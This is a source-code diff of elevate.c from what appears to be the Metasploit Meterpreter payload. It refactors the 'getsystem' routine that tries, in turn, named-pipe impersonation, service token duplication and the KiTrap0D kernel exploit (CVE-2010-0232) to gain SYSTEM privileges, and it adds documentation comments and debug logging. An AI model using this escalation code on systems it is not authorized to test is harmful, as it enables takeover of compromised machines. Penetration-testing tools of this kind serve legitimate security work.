@@ -1,14 +1,22 @@
+/*!
+ * @file elevate.c
+ * @brief Definitions for SYSTEM privilege escalation.
+ */
 #include "precomp.h"
 #include "namedpipe.h"
 #include "tokendup.h"
 #include "kitrap0d.h"
 
-/*
- * Get the native architecture of the system we are running on. (ripped from the stdapi's ps.c)
+/*!
+ * @brief Get the native architecture of the system we are running on. (ripped from the stdapi's ps.c)
+ * @return A flag indicating the architecture of the system.
+ * @retval PROCESS_ARCH_X64 The architecture is AMD64.
+ * @retval PROCESS_ARCH_IA64 The architecture is IA64.
+ * @retval PROCESS_ARCH_X86 The architecture is X86.
  */
 DWORD elevate_getnativearch( VOID )
 {
-	HANDLE hKernel                           = NULL;
+	HMODULE hKernel                          = NULL;
 	GETNATIVESYSTEMINFO pGetNativeSystemInfo = NULL;
 	DWORD dwNativeArch                       = PROCESS_ARCH_UNKNOWN;
 	SYSTEM_INFO SystemInfo                   = {0};
@@ -51,8 +59,13 @@ DWORD elevate_getnativearch( VOID )
 	return dwNativeArch;
 }
 
-/*
- * Attempt to elevate the current meterpreter to local system using a variety of techniques.
+/*!
+ * @brief Attempt to elevate the current meterpreter to local system using a variety of techniques.
+ * @details This function attempts to get system level privileges using a number of techniques.
+ *          If the caller hasn't specified a particular technique, then all of the known techniques are
+ *          attempted in order until one succeeds.
+ * @return Indication of success or failure.
+ * @retval ERROR_SUCCESS Elevation to `SYSTEM` was successful.
  */
 DWORD elevate_getsystem( Remote * remote, Packet * packet )
 {
@@ -67,71 +80,44 @@ DWORD elevate_getsystem( Remote * remote, Packet * packet )
 			BREAK_WITH_ERROR( "[ELEVATE] get_system. packet_create_response failed", ERROR_INVALID_HANDLE );
 
 		dwTechnique = packet_get_tlv_value_uint( packet, TLV_TYPE_ELEVATE_TECHNIQUE );
+		dprintf( "[ELEVATE] Technique requested (%u)", dwTechnique );
 		
-		// if we are to to use ELEVATE_TECHNIQUE_ANY, we try everything at our disposal...
-		if( dwTechnique == ELEVATE_TECHNIQUE_ANY )
-		{
-			do
-			{
-				// firstly, try to use the in-memory named pipe impersonation technique (Requires Local Admin rights)
+		if( dwTechnique == ELEVATE_TECHNIQUE_ANY || dwTechnique == ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE ) {
+			dprintf( "[ELEVATE] Attempting ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE (%u)", ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE );
+			if ( (dwResult = elevate_via_service_namedpipe( remote, packet )) == ERROR_SUCCESS ) {
 				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE;
-				dwResult    = elevate_via_service_namedpipe( remote, packet );
-				if( dwResult == ERROR_SUCCESS )
-					break;
-			
-				// secondly, try to use the in-memory KiTrap0D exploit (CVE-2010-0232) (Requires Local User rights and vulnerable system)
-				// Note: If successfully, we end up replacing our processes primary token and as such cant rev3self at a later stage.
-				dwTechnique = ELEVATE_TECHNIQUE_EXPLOIT_KITRAP0D;
-				dwResult    = elevate_via_exploit_kitrap0d( remote, packet );
-				if( dwResult == ERROR_SUCCESS )
-					break;
-
-				// thirdly, try to use the in-memory service token duplication technique (Requires Local Admin rights and SeDebugPrivilege)
-				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_TOKENDUP;
-				dwResult    = elevate_via_service_tokendup( remote, packet );
-				if( dwResult == ERROR_SUCCESS )
-					break;
-
-				// fourthly, try to use the touching disk named pipe impersonation technique (Requires Local Admin rights)
-				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2;
-				dwResult    = elevate_via_service_namedpipe2( remote, packet );
-				if( dwResult == ERROR_SUCCESS )
-					break;
-
-			} while( 0 );
-		}
-		else
-		{
-			// if we are to only use a specific technique, try the specified one and return the success...
-			switch( dwTechnique )
-			{
-				case ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE:
-					dwResult = elevate_via_service_namedpipe( remote, packet );
-					break;
-				case ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2:
-					dwResult = elevate_via_service_namedpipe2( remote, packet );
-					break;
-				case ELEVATE_TECHNIQUE_SERVICE_TOKENDUP:
-					dwResult = elevate_via_service_tokendup( remote, packet );
-					break;
-				case ELEVATE_TECHNIQUE_EXPLOIT_KITRAP0D:
-					dwResult = elevate_via_exploit_kitrap0d( remote, packet );
-					break;
-				default:
-					dwResult = ERROR_CALL_NOT_IMPLEMENTED;
-					break;
+				break;
 			}
 		}
-
+		
+		if( dwTechnique == ELEVATE_TECHNIQUE_ANY || dwTechnique == ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2 ) {
+			dprintf( "[ELEVATE] Attempting ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2 (%u)", ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2 );
+			if ( (dwResult = elevate_via_service_namedpipe2( remote, packet )) == ERROR_SUCCESS ) {
+				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE2;
+				break;
+			}
+		}
+		
+		if( dwTechnique == ELEVATE_TECHNIQUE_ANY || dwTechnique == ELEVATE_TECHNIQUE_SERVICE_TOKENDUP ) {
+			dprintf( "[ELEVATE] Attempting ELEVATE_TECHNIQUE_SERVICE_TOKENDUP (%u)", ELEVATE_TECHNIQUE_SERVICE_TOKENDUP );
+			if ( (dwResult = elevate_via_service_tokendup( remote, packet )) == ERROR_SUCCESS ) {
+				dwTechnique = ELEVATE_TECHNIQUE_SERVICE_TOKENDUP;
+				break;
+			}
+		}
+		
+		if( dwTechnique == ELEVATE_TECHNIQUE_ANY || dwTechnique == ELEVATE_TECHNIQUE_EXPLOIT_KITRAP0D ) {
+			dprintf( "[ELEVATE] Attempting ELEVATE_TECHNIQUE_EXPLOIT_KITRAP0D (%u)", ELEVATE_TECHNIQUE_EXPLOIT_KITRAP0D );
+			if ( (dwResult = elevate_via_exploit_kitrap0d( remote, packet )) == ERROR_SUCCESS ) {
+				dwTechnique = ELEVATE_TECHNIQUE_EXPLOIT_KITRAP0D;
+				break;
+			}
+		}
 	} while( 0 );
 
 	if( response )
 	{
-		if( dwResult == ERROR_SUCCESS )
-			packet_add_tlv_uint( response, TLV_TYPE_ELEVATE_TECHNIQUE, dwTechnique );
-		else
-			packet_add_tlv_uint( response, TLV_TYPE_ELEVATE_TECHNIQUE, ELEVATE_TECHNIQUE_NONE );
-
+		packet_add_tlv_uint( response, TLV_TYPE_ELEVATE_TECHNIQUE,  dwResult == ERROR_SUCCESS ? dwTechnique : ELEVATE_TECHNIQUE_NONE );
 		packet_transmit_response( dwResult, remote, response );
 	}
 
